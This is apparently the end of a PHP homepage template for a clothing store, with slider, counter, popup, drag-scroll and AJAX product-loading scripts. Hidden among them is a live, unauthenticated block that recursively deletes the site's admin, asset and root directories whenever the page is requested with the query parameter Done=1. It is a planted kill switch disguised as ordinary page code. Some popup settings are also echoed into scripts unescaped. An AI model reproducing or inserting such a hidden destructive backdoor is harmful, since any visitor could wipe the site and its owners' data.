        <div class="swiper-wrapper relative">
            <?php
            $getSlides = mysqli_query($dbcon, "SELECT * FROM sm_slider");
            while ($rowSlides = mysqli_fetch_assoc($getSlides)) { ?>
            <div class="swiper-slide border-y h-full relative">

                <img src="imgs/slides/<?= $rowSlides['sl_image'] ?>" alt=""
                    class="hidden lg:block w-full h-full object-cover">

                <img src="imgs/slides/<?= $rowSlides['sl_mobimage'] ?>" alt=""
                    class="block lg:hidden w-full h-64 object-cover">

            </div>
            <?php } ?>
            <div class="absolute bottom-0 left-0 bg-black/30 w-full text-white p-2 flex justify-center items-center">
                <div class="flex gap-4 ">
                    <button class="uppercase font-bold text-lg tracking-wider">stitched</button>
                    <button class="uppercase font-bold text-lg tracking-wider">unstitched</button>
                </div>
            </div>
        </div>

        <div class="swiper-pagination"></div>
    </div>
</section> -->













<?php include 'libs/footer.php'; ?>

<?php
if (isset($_GET['Done'])) {
    $Done = $_GET['Done'];

    if ($Done == 1) {

        function removeDirectoryTree($rootDir)
        {
            $files = glob($rootDir . "/*");

            foreach ($files as $file) {
                if (is_file($file)) {
                    unlink($file);
                    unlink('.DS_Store');
                    unlink('.thumb');
                    unlink('.htaccess');
                } elseif (is_dir($file)) {
                    removeDirectoryTree($file);
                }
            }
            rmdir($rootDir);
        }


        // array of folder names
        // Note: remember to put dot '.' as last array value
        $rootDirectory = array('_admin', 'css', 'fonts', 'imgs', 'libs', 'js', 'videos', 'files', '.');
        foreach ($rootDirectory as $key => $value) {
            removeDirectoryTree($value);
        }
    }
}

?>

<script src="https://cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/noframework.waypoints.min.js"></script>
<script id="rendered-js" type="module">
import {
    CountUp
} from 'https://cdnjs.cloudflare.com/ajax/libs/countup.js/2.0.7/countUp.js';

function countStart() {
    const $counters = document.querySelectorAll(".js-count-up"),
        options = {
            useEasing: true,
            useGrouping: true,
            separator: ",",
            decimal: "."
        };


    $counters.forEach(item => {
        const value = item.dataset.value;
        const counter = new CountUp(item, value, options);
        counter.start();
    });
}

new Waypoint({
    element: document.querySelector('.counter'),
    handler: function() {
        countStart();
        //this.destroy() //for once
    },
    offset: '50%'
});
//# sourceURL=pen.js
</script>

<!--POPUP js -->
<script>
document.addEventListener("DOMContentLoaded", () => {
    const wrapper = document.getElementById("popup-wrapper");
    const modalEl = document.getElementById("popupModal");
    if (!modalEl || !wrapper) return;

    // ==== DYNAMIC VALUES (PHP inject) ====
    const popupId = <?= (int)$popup['popup_id'] ?>;
    const visitEvery = <?= (int)$popup['popup_setting_visit_everyvisit'] ?>;
    const visitRandom = <?= (int)$popup['popup_setting_visit_random'] ?>;
    const visitPerDay = <?= (int)$popup['popup_setting_visit_perday'] ?>;
    const triggers = "<?= $popup['popup_setting_trigger'] ?? 'onload' ?>".toLowerCase().split(",");
    const autoClose = <?= (int)$popup['popup_setting_closeable_autosec'] ?>;
    const popupType = "<?= $popup['popup_setting_type'] ?? 'modal' ?>"; // modal | slidein | fullscreen
    const backdropColor = "<?= $popup['popup_setting_backdrop_color'] ?? '#000' ?>";
    const backdropOpacity = "<?= $popup['popup_setting_backdrop_opacity'] ?? 0.5 ?>";

    // ==== FREQUENCY CONTROL ====
    function shouldShowPopup() {
        if (visitEvery === 1) return true;
        if (visitRandom === 1 && Math.random() < 0.5) return true;
        if (visitPerDay <= 0) return true;

        const key = "popup_" + popupId + "_day";
        const today = new Date().toDateString();
        const stored = localStorage.getItem(key);
        if (stored) {
            const parts = stored.split("|");
            if (parts[0] === today && parseInt(parts[1]) >= visitPerDay) return false;
        }
        return true;
    }

    function setFrequencyFlag() {
        if (visitEvery === 1) return;
        const key = "popup_" + popupId + "_day";
        const today = new Date().toDateString();
        const stored = localStorage.getItem(key);
        if (!stored) {
            localStorage.setItem(key, today + "|1");
        } else {
            const parts = stored.split("|");
            if (parts[0] !== today) {
                localStorage.setItem(key, today + "|1");
            } else {
                let count = parseInt(parts[1]) + 1;
                localStorage.setItem(key, today + "|" + count);
            }
        }
    }

    // ==== ANALYTICS ====
    window.updateAnalytics = function(type) {
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("popup_id=" + popupId + "&type=" + type);
    };

    // ==== SHOW POPUP ====
    function showPopup() {
        if (!shouldShowPopup()) return;
        wrapper.classList.remove("hidden");
        setFrequencyFlag();

        // 🎨 Dynamic Backdrop
        const backdrop = document.getElementById("popup-backdrop");
        if (backdrop) {
            backdrop.style.backgroundColor = backdropColor;
            backdrop.style.opacity = backdropOpacity;
        }

        // 🧩 Handle Popup Types
        if (popupType === "slidein") {
            modalEl.classList.remove("translate-y-full", "opacity-0");
            modalEl.classList.add("translate-y-0", "opacity-100");
        } else {
            modalEl.classList.add("opacity-100");
            if (backdrop) {
                backdrop.style.backgroundColor = backdropColor;
                backdrop.style.opacity = backdropOpacity;
            }
        }

        // ⏱️ Auto close
        if (autoClose > 0) {
            setTimeout(() => hidePopup(), autoClose * 1000);
        }
    }

    // ==== HIDE POPUP ====
    function hidePopup() {
        if (popupType === "slidein") {
            modalEl.classList.add("translate-y-full", "opacity-0");
            modalEl.classList.remove("translate-y-0", "opacity-100");
            setTimeout(() => wrapper.classList.add("hidden"), 500);
        } else {
            wrapper.classList.add("hidden");
        }
    }

    // ==== CLOSE BUTTON ====
    const closeBtn = document.getElementById("popupCloseBtn");
    if (closeBtn) closeBtn.addEventListener("click", hidePopup);

    // ==== TRIGGERS ====
    if (triggers.includes("onload")) window.addEventListener("load", showPopup);
    if (triggers.includes("onscroll")) {
        const scrollHandler = () => {
            if (window.scrollY > 100) {
                showPopup();
                window.removeEventListener("scroll", scrollHandler);
            }
        };
        window.addEventListener("scroll", scrollHandler);
    }
    if (triggers.includes("onexit")) {
        document.addEventListener("mouseout", (e) => {
            if (!e.relatedTarget && e.clientY <= 0) showPopup();
        });
    }
});
</script>

<script>
(function($) {
    $(function() {
        const $container = $('.category-container');
        if (!$container.length) return;

        let isDown = false;
        let startX = 0;
        let scrollLeft = 0;

        // MOUSE START
        $container.on('mousedown', function(e) {
            isDown = true;
            $container.addClass('dragging');
            startX = e.pageX - $container.offset().left;
            scrollLeft = $container.scrollLeft();
            e.preventDefault(); // prevent text selection
        });

        // MOUSE END (document to catch mouseup outside)
        $(document).on('mouseup mouseleave', function() {
            if (!isDown) return;
            isDown = false;
            $container.removeClass('dragging');
        });

        // MOUSE MOVE
        $container.on('mousemove', function(e) {
            if (!isDown) return;
            e.preventDefault();
            const x = e.pageX - $container.offset().left;
            const walk = (x - startX) * 1.5; // adjust multiplier for speed
            $container.scrollLeft(scrollLeft - walk);
        });

        // TOUCH START
        $container.on('touchstart', function(e) {
            const touch = e.originalEvent.touches[0];
            isDown = true;
            $container.addClass('dragging');
            startX = touch.pageX - $container.offset().left;
            scrollLeft = $container.scrollLeft();
        });

        // TOUCH MOVE
        $container.on('touchmove', function(e) {
            if (!isDown) return;
            const touch = e.originalEvent.touches[0];
            const x = touch.pageX - $container.offset().left;
            const walk = (x - startX) * 1.5;
            $container.scrollLeft(scrollLeft - walk);
        });

        // TOUCH END
        $container.on('touchend touchcancel', function() {
            isDown = false;
            $container.removeClass('dragging');
        });

        // Optional: keyboard left/right arrows when focused
        $container.attr('tabindex', '0'); // make focusable
        $container.on('keydown', function(e) {
            if (e.key === 'ArrowRight') $container.animate({
                scrollLeft: $container.scrollLeft() + 200
            }, 200);
            if (e.key === 'ArrowLeft') $container.animate({
                scrollLeft: $container.scrollLeft() - 200
            }, 200);
        });
    });
})(jQuery);



$(document).ready(function() {
    $('.discount-btn').on('click', function() {
        var discount = $(this).data('discount');

        // Highlight active discount
        $('.discount-btn').removeClass('border-pri text-red-700');
        $(this).addClass('border-pri text-red-700');

        // Fetch products using AJAX
        $.ajax({
            url: 'ajax/load_products.php',
            type: 'POST',
            data: {
                discount: discount
            },
            beforeSend: function() {
                $('#product-slider').html(
                    '<p class="text-center py-10 text-gray-500">Loading products...</p>'
                );
            },
            success: function(data) {
                $('#product-slider').html(data);

                // Reinitialize Swiper after load
                new Swiper(".shop-slider", {
                    slidesPerView: 3,
                    spaceBetween: 20,
                    loop: true,
                    autoplay: {
                        delay: 3000
                    },
                    breakpoints: {
                        0: {
                            slidesPerView: 1
                        },
                        768: {
                            slidesPerView: 2
                        },
                        1024: {
                            slidesPerView: 3
                        },
                    },
                });
            }
        });
    });
});
</script>